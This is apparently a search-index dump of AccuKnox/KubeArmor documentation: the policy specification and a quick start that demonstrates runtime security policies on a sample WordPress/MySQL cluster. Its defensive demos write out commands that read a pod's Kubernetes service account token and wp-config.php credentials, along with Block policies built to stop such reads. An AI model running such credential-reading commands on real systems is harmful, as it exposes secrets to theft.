Accuknox policy auto-discovery engine leverages the pod visibility provided by KubeArmor and Cilium to auto-generate network and system policies. Policy Templates \u00b6 Accuknox provides recommended policies based popular workloads or for the host (based on MITRE ). The policy-templates open source repo provides policy templates based on KubeArmor and Cilium policies for: Known CVEs and attack vectors Compliance frameworks (such as PCI-DSS ) MITRE based host policies STIG based policies for popular workloads Accuknox intends to garner community contribution towards such policy-templates and open-sourced policy engines certainly helps this cause further.","title":"Overview"},{"location":"open-source/open-source-accuknox/#accuknox-and-open-source","text":"AccuKnox provides most of the core policy enforcement engines and other associated tooling as open-source. Accuknox believes that a security focussed product needs to have full transparency in its operations and we also believe in the power of community. With that in mind AccuKnox has following open source components:","title":"AccuKnox and Open Source"},{"location":"open-source/open-source-accuknox/#accuknox-cilium","text":"Accuknox maintains a fork of cilium with certain added features. While Accuknox aims to eventually upstream the changes, the upstreaming work progresses at its own pace. Accuknox-Cilium currently has following additional features: SPIFFE based Identity Solution : Accuknox intends to use an Identity layer that is not k8s-dependent and can flexibly scale to any scenarios (IoT, Edge, 5G, VM, Bare-Metal etc). With that in mind, AccuKnox implemented the changes in Cilium control plane to provision the Identity for the workloads based on SPIFFE . AccuKnox made use of SPIRE reference implementation and integrated with Cilium. The details of this solution were presented in Kubecon 2021 (Production Identity Day) event and the recording is available here. The upstreaming work for this feature is currently in progress. Policy Audit/Staging : Policy audit/staging is an important feature that allows the user to validate the impact of policy before enforcing it. If there are connections or packets denied due to an application of a new policy that will show up in the audit policies whilst the application would still continue functioning. Cilium policies currently cannot be audited on per policy basis. This feature developed by Accuknox allows to handle two things: Get policy details on per alert/telemetry basis. With this it would be possible to get the policy statistics such as denied packets/connections on per policy basis. Allow policy audit configuration on per policy basis.","title":"Accuknox-Cilium"},{"location":"open-source/open-source-accuknox/#kubearmor","text":"KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level. With KubeArmor, a user can: restrict file system access for certain processes restrict what processes can be spawned within the pod restrict the capabilities that can be used by the processes within the pod KubeArmor differs from seccomp based profiles, wherein KubeArmor allows to dynamically set the restrictions on the pod. With seccomp the restrictions must be placed during the pod startup and cannot be changed later. KubeArmor leverages Linux Security Modules (LSMs) to enforce policies at runtime.","title":"KubeArmor"},{"location":"open-source/open-source-accuknox/#policy-auto-discovery","text":"Accuknox policy enforcement engines based on KubeArmor and Cilium are very flexible and powerful. However, these policy engines must be fed with policies. With 10s or 100s of pods and workloads running in a cluster it is insanely difficult to handcraft such policies. Accuknox policy auto-discovery engine leverages the pod visibility provided by KubeArmor and Cilium to auto-generate network and system policies.","title":"Policy Auto Discovery"},{"location":"open-source/open-source-accuknox/#policy-templates","text":"Accuknox provides recommended policies based popular workloads or for the host (based on MITRE ). The policy-templates open source repo provides policy templates based on KubeArmor and Cilium policies for: Known CVEs and attack vectors Compliance frameworks (such as PCI-DSS ) MITRE based host policies STIG based policies for popular workloads Accuknox intends to garner community contribution towards such policy-templates and open-sourced policy engines certainly helps this cause further.","title":"Policy Templates"},{"location":"open-source/policy-specification-for-kubearmor/","text":"Specification of Security Policy for Containers \u00b6 Policy Specification \u00b6 Here is the specification of a security policy. apiVersion: security.kubearmor.com/v1 kind:KubeArmorPolicy metadata: name: [policy name] namespace: [namespace name] spec: severity: [1-10] # --> optional (1 by default) tags: [\"tag\", ...] # --> optional message: [message] # --> optional selector: matchLabels: [key1]: [value1] [keyN]: [valueN] process: matchPaths: - path: [absolute executable path] ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchPatterns: - pattern: [regex pattern] ownerOnly: [true|false] # --> optional file: matchPaths: - path: [absolute file path] readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchPatterns: - pattern: [regex pattern] readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional network: matchProtocols: - protocol: [TCP|tcp|UDP|udp|ICMP|icmp] fromSource: # --> optional - path: [absolute exectuable path] capabilities: matchCapabilities: - capability: [capability name] fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] (Block by default) For better understanding, you can check the KubeArmorPolicy spec diagram . Policy Spec Description \u00b6 Now, we will briefly explain how to define a security policy. Common A security policy starts with the base information such as apiVersion, kind, and metadata. The apiVersion and kind would be the same in any security policies. In the case of metadata, you need to specify the names of a policy and a namespace where you want to apply the policy. apiVersion: security.kubearmor.com/v1 kind:KubeArmorPolicy metadata: name: [policy name] namespace: [namespace name] Severity The severity part is somewhat important. You can specify the severity of a given policy from 1 to 10. This severity will appear in alerts when policy violations happen. severity: [1-10] Tags The tags part is optional. You can define multiple tags (e.g., WARNNING, SENSITIVE, MITRE, STIG, etc.) to categorize security policies. tags: [\"tag1\", ..., \"tagN\"] Message The message part is optional. You can add an alert message, and then the message will be presented in alert logs. message: [message] Selector The selector part is relatively straightforward. Similar to other Kubernetes configurations, you can specify \\(a group of\\) pods based on labels. selector: matchLabels: [key1]: [value1] [keyN]: [valueN] Process In the process section, there are three types of matches: matchPaths, matchDirectories, and matchPatterns. You can define specific executables using matchPaths or all executables in specific directories using matchDirectories. In the case of matchPatterns, advanced operators may be able to determine particular patterns for executables by using regular expressions. However, the coverage of regular expressions is highly dependent on AppArmor \\([Policy Core Reference](https://gitlab.com/apparmor/apparmor/-/wikis/AppArmor_Core_Policy_Reference)\\) . Thus, we generally do not recommend using this match. process: matchPaths: - path: [absolute executable path] ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute executable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchPatterns: - pattern: [regex pattern] ownerOnly: [true|false] # --> optional In each match, there are three options. ownerOnly \\(static action: allow owner only; otherwise block all\\) If this is enabled, the owners of the executable \\(s\\) defined with matchPaths and matchDirectories will be only allowed to execute. recursive If this is enabled, the coverage will extend to the subdirectories of the directory defined with matchDirectories. fromSource If a path is specified in fromSource, the executable at the path will be allowed/blocked to execute the executables defined with matchPaths or matchDirectories. For better understanding, let us say that an operator defines a policy as follows. Then, /bin/bash will be only allowed (blocked) to execute /bin/sleep. Otherwise, the execution of /bin/sleep will be blocked (allowed). process: matchPaths: - path: /bin/sleep fromSource: - path: /bin/bash File The file section is quite similar to the process section. file: matchPaths: - path: [absolute file path] readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute file path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute file path] matchPatterns: - pattern: [regex pattern] readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional The only difference between 'process' and 'file' is the readOnly option. readOnly \\(static action: allow to read only; otherwise block all\\) If this is enabled, the read operation will be only allowed, and any other operations \\(e.g., write\\) will be blocked. Network In the case of network, there is currently one match type: matchProtocols. You can define specific protocols among TCP, UDP, and ICMP. network: matchProtocols: - protocol: [protocol] # --> [ TCP | tcp | UDP | udp | ICMP | icmp ] fromSource: # --> optional - path: [absolute file path] Capabilities In the case of capabilities, there is currently one match type: matchCapabilities. You can define specific capability names to allow or block using matchCapabilities. You can check available capabilities in Capability List . capabilities: matchCapabilities: - capability: [capability name] fromSource: # --> optional - path: [absolute file path] Action The action could be Allow, Audit, or Block. Security policies would be handled in a blacklist manner or a whitelist manner according to the action. Thus, you need to define the action carefully. You can refer to Consideration in Policy Action for more details. In the case of the Audit action, we can use this action for policy verification before applying a security policy with the Block action. action: [Allow|Audit|Block]","title":"Policy specification"},{"location":"open-source/policy-specification-for-kubearmor/#specification-of-security-policy-for-containers","text":"","title":"Specification of Security Policy for Containers"},{"location":"open-source/policy-specification-for-kubearmor/#policy-specification","text":"Here is the specification of a security policy. apiVersion: security.kubearmor.com/v1 kind:KubeArmorPolicy metadata: name: [policy name] namespace: [namespace name] spec: severity: [1-10] # --> optional (1 by default) tags: [\"tag\", ...] # --> optional message: [message] # --> optional selector: matchLabels: [key1]: [value1] [keyN]: [valueN] process: matchPaths: - path: [absolute executable path] ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchPatterns: - pattern: [regex pattern] ownerOnly: [true|false] # --> optional file: matchPaths: - path: [absolute file path] readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchPatterns: - pattern: [regex pattern] readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional network: matchProtocols: - protocol: [TCP|tcp|UDP|udp|ICMP|icmp] fromSource: # --> optional - path: [absolute exectuable path] capabilities: matchCapabilities: - capability: [capability name] fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] (Block by default) For better understanding, you can check the KubeArmorPolicy spec diagram .","title":"Policy Specification"},{"location":"open-source/policy-specification-for-kubearmor/#policy-spec-description","text":"Now, we will briefly explain how to define a security policy. Common A security policy starts with the base information such as apiVersion, kind, and metadata. The apiVersion and kind would be the same in any security policies. In the case of metadata, you need to specify the names of a policy and a namespace where you want to apply the policy. apiVersion: security.kubearmor.com/v1 kind:KubeArmorPolicy metadata: name: [policy name] namespace: [namespace name] Severity The severity part is somewhat important. You can specify the severity of a given policy from 1 to 10. This severity will appear in alerts when policy violations happen. severity: [1-10] Tags The tags part is optional. You can define multiple tags (e.g., WARNNING, SENSITIVE, MITRE, STIG, etc.) to categorize security policies. tags: [\"tag1\", ..., \"tagN\"] Message The message part is optional. You can add an alert message, and then the message will be presented in alert logs. message: [message] Selector The selector part is relatively straightforward. Similar to other Kubernetes configurations, you can specify \\(a group of\\) pods based on labels. selector: matchLabels: [key1]: [value1] [keyN]: [valueN] Process In the process section, there are three types of matches: matchPaths, matchDirectories, and matchPatterns. You can define specific executables using matchPaths or all executables in specific directories using matchDirectories. In the case of matchPatterns, advanced operators may be able to determine particular patterns for executables by using regular expressions. However, the coverage of regular expressions is highly dependent on AppArmor \\([Policy Core Reference](https://gitlab.com/apparmor/apparmor/-/wikis/AppArmor_Core_Policy_Reference)\\) . Thus, we generally do not recommend using this match. process: matchPaths: - path: [absolute executable path] ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute executable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchPatterns: - pattern: [regex pattern] ownerOnly: [true|false] # --> optional In each match, there are three options. ownerOnly \\(static action: allow owner only; otherwise block all\\) If this is enabled, the owners of the executable \\(s\\) defined with matchPaths and matchDirectories will be only allowed to execute. recursive If this is enabled, the coverage will extend to the subdirectories of the directory defined with matchDirectories. fromSource If a path is specified in fromSource, the executable at the path will be allowed/blocked to execute the executables defined with matchPaths or matchDirectories. For better understanding, let us say that an operator defines a policy as follows. Then, /bin/bash will be only allowed (blocked) to execute /bin/sleep. Otherwise, the execution of /bin/sleep will be blocked (allowed). process: matchPaths: - path: /bin/sleep fromSource: - path: /bin/bash File The file section is quite similar to the process section. file: matchPaths: - path: [absolute file path] readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute file path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute file path] matchPatterns: - pattern: [regex pattern] readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional The only difference between 'process' and 'file' is the readOnly option. readOnly \\(static action: allow to read only; otherwise block all\\) If this is enabled, the read operation will be only allowed, and any other operations \\(e.g., write\\) will be blocked. Network In the case of network, there is currently one match type: matchProtocols. You can define specific protocols among TCP, UDP, and ICMP. network: matchProtocols: - protocol: [protocol] # --> [ TCP | tcp | UDP | udp | ICMP | icmp ] fromSource: # --> optional - path: [absolute file path] Capabilities In the case of capabilities, there is currently one match type: matchCapabilities. You can define specific capability names to allow or block using matchCapabilities. You can check available capabilities in Capability List . capabilities: matchCapabilities: - capability: [capability name] fromSource: # --> optional - path: [absolute file path] Action The action could be Allow, Audit, or Block. Security policies would be handled in a blacklist manner or a whitelist manner according to the action. Thus, you need to define the action carefully. You can refer to Consideration in Policy Action for more details. In the case of the Audit action, we can use this action for policy verification before applying a security policy with the Block action. action: [Allow|Audit|Block]","title":"Policy Spec Description"},{"location":"open-source/policy-templates/","text":"Accuknox's open source policy discovery engine can then be used to generate the policies based on the observation automatically. generate policies as code representing application file access, network access and process forking) enforceable by Kubearmor . generate policies for Network access (L3, L4 and L7) enforceable by Cilium . These generated policies are then enforced using Kubearmor and Cilium .","title":"Policy templates"},{"location":"open-source/quick_start_guide/","text":"Setup Instructions \u00b6 Deploying Sample Cluster ( skip if you already have a cluster configured ) Local K3s cluster GKE cluster AKS cluster EKS cluster Kubeadm Install K3s Note: Recommended base OS image is Ubuntu 20.04. curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC = '--disable traefik' sh -s - --write-kubeconfig-mode 644 Make K3's cluster config the default mkdir -p ~/.kube && cp /etc/rancher/k3s/k3s.yaml ~/.kube/config - name : create a cluster hosts : localhost tasks : - name : create a cluster google.cloud.gcp_container_cluster : name : gkecluster initial_node_count : 1 node_config : machine_type : e2-medium disk_size_gb : 10 taints : - effect : PREFER_NO_SCHEDULE key : node.cilium.io/agent-not-ready value : \"true\" location : asia-east1 project : \"{{project_id}}\" auth_kind : serviceaccount service_account_file : \"{{service_account_file}}\" state : present sudo apt-get install python3 -y sudo apt-get install ansible ansible-galaxy collection install google.cloud ansible-playbook kube-cluster.yaml - name : Create a managed Azure Container Services (AKS) instance hosts : localhost tasks : - name : azure_rm_aks : name : myAKS location : eastus resource_group : myResourceGroup dns_prefix : akstest kubernetes_version : 1.24.3 linux_profile : admin_username : azureuser ssh_key : \"{{local_ssh_key}}\" service_principal : client_id : \"{{azure_account_client_id}}\" client_secret : \"{{azure_account_client_secret}}\" agent_pool_profiles : - name : default count : 2 vm_size : Standard_D2_v2 sudo apt-get install python3 -y sudo apt-get install ansible ansible-galaxy collection install azure.azcollection ansible-playbook aks-cluster.yaml apiVersion : eksctl.io/v1alpha5 kind : ClusterConfig metadata : name : kubearmor-ub20 region : us-east-2 nodeGroups : - name : ng-1 amiFamily : \"Ubuntu2004\" privateNetworking : true desiredCapacity : 2 # taint nodes so that application pods are # not scheduled until Cilium is deployed. taints : - key : \"node.cilium.io/agent-not-ready\" value : \"true\" effect : \"NoSchedule\" ssh : allow : true preBootstrapCommands : - \"sudo apt install linux-headers-$(uname -r)\" eksctl create cluster -f sample-ubuntu-18.04-cluster.yaml aws eks --region us-east-1 update-kubeconfig --name kubearmor-ub20 Install Pre-requisites VirtualBox Vagrant kubectl Helm Download the Vagrant setup Click here to download Untar and goto the Vagrant setup directory, Run the below command vagrant up Ref: KubeArmor support matrix 1. Install kubearmor cli tool, daemonsets and services \u00b6 Install kubearmor cli tool \u00b6 curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin Install DaemonSets and Services \u00b6 # Install KubeArmor karmor install # Install Discovery-Engine kubectl create ns explorer kubectl apply -f https://raw.githubusercontent.com/kubearmor/discovery-engine/dev/deployments/k8s/deployment.yaml -n explorer Output from kubectl get pods -A NAMESPACE NAME READY STATUS RESTARTS AGE explorer knoxautopolicy-7d77f658fb-m2g8q 1 /1 Running 0 3m58s kube-system kubearmor-78tnh 1 /1 Running 0 4m7s kube-system kubearmor-annotation-manager-797c848b9c-vxq8c 2 /2 Running 0 4m kube-system kubearmor-host-policy-manager-766447b4d7-fr5m4 2 /2 Running 0 4m6s kube-system kubearmor-policy-manager-54ffc4dc56-8szmn 2 /2 Running 0 4m6s kube-system kubearmor-relay-645667c695-bfwcn 1 /1 Running 0 4m7s ... We have following installed: KubeArmor Protection Engine Discovery Engine KubeArmor Relay 2. Install Sample Application \u00b6 Install the following app ( WordPress ) or you can try your own K8s app. kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml Output from kubectl get pods -n wordpress-mysql NAME READY STATUS RESTARTS AGE mysql-58cdf6ccf-kzbp8 1 /1 Running 0 12s wordpress-bf95888cb-2kx65 1 /1 Running 0 13s Keep a note of these pods name mysql-xxxxxxxxx-xxxxx & wordpress-xxxxxxxxx-xxxxx , it'll be different for your environment The use-cases described in subsequent step uses this sample application. 3. Demo Scenario & Use-cases \u00b6 Use-case 1: Audit access to sensitive data paths MySQL keeps all its database tables as part of /var/lib/mysql folder path. Audit access to this folder path recursively (sub-folders inclusive). apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-mysql-audit-dir namespace : wordpress-mysql spec : severity : 5 selector : matchLabels : app : mysql file : matchDirectories : - dir : /var/lib/mysql/ recursive : true action : Audit Executing inside MySQL pod: Before applying policy kubectl exec -it mysql-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@mysql-58cdf6ccf-kzbp8:/# touch /var/lib/mysql/test NOTE 01: Replace mysql-xxxxxxxxx-xxxxx with pod name from Step #2 Applying Policy: Applying above policy to deployed application kubectl apply -f ksp-mysql-audit-dir.yaml Port Forwarding: We'll be using KubeArmor relay to forward logs to our local system kubectl -n kube-system port-forward service/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 Realtime Logs Streaming: karmor log NOTE 02: Above 2 commands will be common for all use cases, keep this open in separate terminals ( right section of screenshot ) Executing inside MySQL pod: After applying policy kubectl exec -it mysql-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@mysql-58cdf6ccf-kzbp8:/# touch /var/lib/mysql/test-2 Use-case 2: Block access to files containing sensitive data WordPress pod contains a file wp-config.php that has sensitive auth credentials. This use-case is to Block access to this file from unknown processes. Executing inside WordPress pod: Before applying policy kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@wordpress-bf95888cb-2kx65:/var/www/html# cat /var/www/html/wp-config.php apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-wordpress-block-config namespace : wordpress-mysql spec : severity : 10 selector : matchLabels : app : wordpress file : matchPaths : - path : /var/www/html/wp-config.php fromSource : - path : /bin/cat action : Block Applying Policy: Applying above policy to deployed application kubectl apply -f ksp-wordpress-block-config.yaml Executing inside WordPress pod: After applying policy kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@wordpress-bf95888cb-2kx65:/var/www/html# cat /var/www/html/wp-config.php cat: /var/www/html/wp-config.php: Permission denied Use-case 3: Block access to K8s service account token A pod is the primary execution unit in K8s. One problem with this approach is that all the processes within that pod have unrestricted access to the pod's volume mounts. One such volume mount is a service account token. Thus, accessing a service account token using an injected binary is a common attack pattern in K8s. This use-case explains how you can protect access ( Block ) to the service account token through known processes only. Executing inside WordPress pod: Before applying policy kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@wordpress-bf95888cb-2kx65:/var/www/html# cat /run/secrets/kubernetes.io/serviceaccount/token apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-wordpress-block-sa namespace : wordpress-mysql spec : severity : 7 selector : matchLabels : app : wordpress file : matchDirectories : - dir : /run/secrets/kubernetes.io/serviceaccount/ recursive : true action : Block Applying Policy: Applying above policy to deployed application kubectl apply -f ksp-wordpress-block-sa.yaml Executing inside WordPress pod: After applying policy kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@wordpress-bf95888cb-2kx65:/var/www/html# cat /run/secrets/kubernetes.io/serviceaccount/token cat: /run/secrets/kubernetes.io/serviceaccount/token: Permission denied Use-case 4: Block execution of unwanted processes A container image might get shipped with binaries that are not supposed to be executed in production environments. For e.g., WordPress contains apt , apt-get binaries that are used for dynamic package management. These should never be used in the production environment since it will create drift (change) in the container contents i.e., introduce new files/binaries that might increase the attack surface. The following policy Block the execution of such processes. Executing inside WordPress pod: Before applying policy kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@wordpress-bf95888cb-2kx65:/var/www/html# apt root@wordpress-bf95888cb-2kx65:/var/www/html# apt-get update apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-wordpress-block-process namespace : wordpress-mysql spec : severity : 3 selector : matchLabels : app : wordpress process : matchPaths : - path : /usr/bin/apt - path : /usr/bin/apt-get action : Block Applying Policy: Applying above policy to deployed application kubectl apply -f ksp-wordpress-block-process.yaml Executing inside WordPress pod: After applying policy kubectl exec -it wordpress-5679855487-58rfz -n wordpress-mysql \u2013- bash root@wordpress-bf95888cb-2kx65:/var/www/html# apt bash: /usr/bin/apt: Permission denied root@wordpress-bf95888cb-2kx65:/var/www/html# apt-get update bash: /usr/bin/apt-get: Permission denied 4. Get Auto-Discovered Policies \u00b6 In the above Demo Scenario (last 3 use-cases) , we had explicit Deny based policies. KubeArmor also supports Allow based policies i.e., allow only specific actions and audit/deny everything else. Also the allow-policies are auto-discovered by examining the workloads at runtime. To retrieve the auto discovered policies you can use: karmor discover -n wordpres-mysql -l \"app=wordpress\" -f yaml This discovers the policies for a workload in wordpress-mysql namespace having label app=wordpress . Output from karmor discover -n wordpress-mysql -l \"app=wordpress\" -f yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : autopol-system-3960684242 namespace : wordpress-mysql spec : action : Allow file : matchPaths : - fromSource : - path : /usr/sbin/apache2 path : /dev/urandom - fromSource : - path : /usr/local/bin/php path : /etc/hosts network : matchProtocols : - fromSource : - path : /usr/local/bin/php protocol : tcp - fromSource : - path : /usr/local/bin/php protocol : udp process : matchPaths : - path : /usr/sbin/apache2 - path : /usr/local/bin/php selector : matchLabels : app : wordpress severity : 1 5. Uninstall \u00b6 karmor uninstall kubectl delete ns explorer References \u00b6 Elastic and Splunk Integration Guide KubeArmor support matrix Integrating Kubearmor with Prometheus and Grafana","title":"Quick Start"},{"location":"open-source/quick_start_guide/#setup-instructions","text":"Deploying Sample Cluster ( skip if you already have a cluster configured ) Local K3s cluster GKE cluster AKS cluster EKS cluster Kubeadm Install K3s Note: Recommended base OS image is Ubuntu 20.04. curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC = '--disable traefik' sh -s - --write-kubeconfig-mode 644 Make K3's cluster config the default mkdir -p ~/.kube && cp /etc/rancher/k3s/k3s.yaml ~/.kube/config - name : create a cluster hosts : localhost tasks : - name : create a cluster google.cloud.gcp_container_cluster : name : gkecluster initial_node_count : 1 node_config : machine_type : e2-medium disk_size_gb : 10 taints : - effect : PREFER_NO_SCHEDULE key : node.cilium.io/agent-not-ready value : \"true\" location : asia-east1 project : \"{{project_id}}\" auth_kind : serviceaccount service_account_file : \"{{service_account_file}}\" state : present sudo apt-get install python3 -y sudo apt-get install ansible ansible-galaxy collection install google.cloud ansible-playbook kube-cluster.yaml - name : Create a managed Azure Container Services (AKS) instance hosts : localhost tasks : - name : azure_rm_aks : name : myAKS location : eastus resource_group : myResourceGroup dns_prefix : akstest kubernetes_version : 1.24.3 linux_profile : admin_username : azureuser ssh_key : \"{{local_ssh_key}}\" service_principal : client_id : \"{{azure_account_client_id}}\" client_secret : \"{{azure_account_client_secret}}\" agent_pool_profiles : - name : default count : 2 vm_size : Standard_D2_v2 sudo apt-get install python3 -y sudo apt-get install ansible ansible-galaxy collection install azure.azcollection ansible-playbook aks-cluster.yaml apiVersion : eksctl.io/v1alpha5 kind : ClusterConfig metadata : name : kubearmor-ub20 region : us-east-2 nodeGroups : - name : ng-1 amiFamily : \"Ubuntu2004\" privateNetworking : true desiredCapacity : 2 # taint nodes so that application pods are # not scheduled until Cilium is deployed. taints : - key : \"node.cilium.io/agent-not-ready\" value : \"true\" effect : \"NoSchedule\" ssh : allow : true preBootstrapCommands : - \"sudo apt install linux-headers-$(uname -r)\" eksctl create cluster -f sample-ubuntu-18.04-cluster.yaml aws eks --region us-east-1 update-kubeconfig --name kubearmor-ub20 Install Pre-requisites VirtualBox Vagrant kubectl Helm Download the Vagrant setup Click here to download Untar and goto the Vagrant setup directory, Run the below command vagrant up Ref: KubeArmor support matrix","title":"Setup Instructions"},{"location":"open-source/quick_start_guide/#1-install-kubearmor-cli-tool-daemonsets-and-services","text":"","title":"1. Install kubearmor cli tool, daemonsets and services"},{"location":"open-source/quick_start_guide/#install-kubearmor-cli-tool","text":"curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin","title":"Install kubearmor cli tool"},{"location":"open-source/quick_start_guide/#install-daemonsets-and-services","text":"# Install KubeArmor karmor install # Install Discovery-Engine kubectl create ns explorer kubectl apply -f https://raw.githubusercontent.com/kubearmor/discovery-engine/dev/deployments/k8s/deployment.yaml -n explorer Output from kubectl get pods -A NAMESPACE NAME READY STATUS RESTARTS AGE explorer knoxautopolicy-7d77f658fb-m2g8q 1 /1 Running 0 3m58s kube-system kubearmor-78tnh 1 /1 Running 0 4m7s kube-system kubearmor-annotation-manager-797c848b9c-vxq8c 2 /2 Running 0 4m kube-system kubearmor-host-policy-manager-766447b4d7-fr5m4 2 /2 Running 0 4m6s kube-system kubearmor-policy-manager-54ffc4dc56-8szmn 2 /2 Running 0 4m6s kube-system kubearmor-relay-645667c695-bfwcn 1 /1 Running 0 4m7s ... We have following installed: KubeArmor Protection Engine Discovery Engine KubeArmor Relay","title":"Install DaemonSets and Services"},{"location":"open-source/quick_start_guide/#2-install-sample-application","text":"Install the following app ( WordPress ) or you can try your own K8s app. kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml Output from kubectl get pods -n wordpress-mysql NAME READY STATUS RESTARTS AGE mysql-58cdf6ccf-kzbp8 1 /1 Running 0 12s wordpress-bf95888cb-2kx65 1 /1 Running 0 13s Keep a note of these pods name mysql-xxxxxxxxx-xxxxx & wordpress-xxxxxxxxx-xxxxx , it'll be different for your environment The use-cases described in subsequent step uses this sample application.","title":"2. Install Sample Application"},{"location":"open-source/quick_start_guide/#3-demo-scenario-use-cases","text":"Use-case 1: Audit access to sensitive data paths MySQL keeps all its database tables as part of /var/lib/mysql folder path. Audit access to this folder path recursively (sub-folders inclusive). apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-mysql-audit-dir namespace : wordpress-mysql spec : severity : 5 selector : matchLabels : app : mysql file : matchDirectories : - dir : /var/lib/mysql/ recursive : true action : Audit Executing inside MySQL pod: Before applying policy kubectl exec -it mysql-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@mysql-58cdf6ccf-kzbp8:/# touch /var/lib/mysql/test NOTE 01: Replace mysql-xxxxxxxxx-xxxxx with pod name from Step #2 Applying Policy: Applying above policy to deployed application kubectl apply -f ksp-mysql-audit-dir.yaml Port Forwarding: We'll be using KubeArmor relay to forward logs to our local system kubectl -n kube-system port-forward service/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 Realtime Logs Streaming: karmor log NOTE 02: Above 2 commands will be common for all use cases, keep this open in separate terminals ( right section of screenshot ) Executing inside MySQL pod: After applying policy kubectl exec -it mysql-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@mysql-58cdf6ccf-kzbp8:/# touch /var/lib/mysql/test-2 Use-case 2: Block access to files containing sensitive data WordPress pod contains a file wp-config.php that has sensitive auth credentials. This use-case is to Block access to this file from unknown processes. Executing inside WordPress pod: Before applying policy kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@wordpress-bf95888cb-2kx65:/var/www/html# cat /var/www/html/wp-config.php apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-wordpress-block-config namespace : wordpress-mysql spec : severity : 10 selector : matchLabels : app : wordpress file : matchPaths : - path : /var/www/html/wp-config.php fromSource : - path : /bin/cat action : Block Applying Policy: Applying above policy to deployed application kubectl apply -f ksp-wordpress-block-config.yaml Executing inside WordPress pod: After applying policy kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@wordpress-bf95888cb-2kx65:/var/www/html# cat /var/www/html/wp-config.php cat: /var/www/html/wp-config.php: Permission denied Use-case 3: Block access to K8s service account token A pod is the primary execution unit in K8s. One problem with this approach is that all the processes within that pod have unrestricted access to the pod's volume mounts. One such volume mount is a service account token. Thus, accessing a service account token using an injected binary is a common attack pattern in K8s. This use-case explains how you can protect access ( Block ) to the service account token through known processes only. Executing inside WordPress pod: Before applying policy kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@wordpress-bf95888cb-2kx65:/var/www/html# cat /run/secrets/kubernetes.io/serviceaccount/token apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-wordpress-block-sa namespace : wordpress-mysql spec : severity : 7 selector : matchLabels : app : wordpress file : matchDirectories : - dir : /run/secrets/kubernetes.io/serviceaccount/ recursive : true action : Block Applying Policy: Applying above policy to deployed application kubectl apply -f ksp-wordpress-block-sa.yaml Executing inside WordPress pod: After applying policy 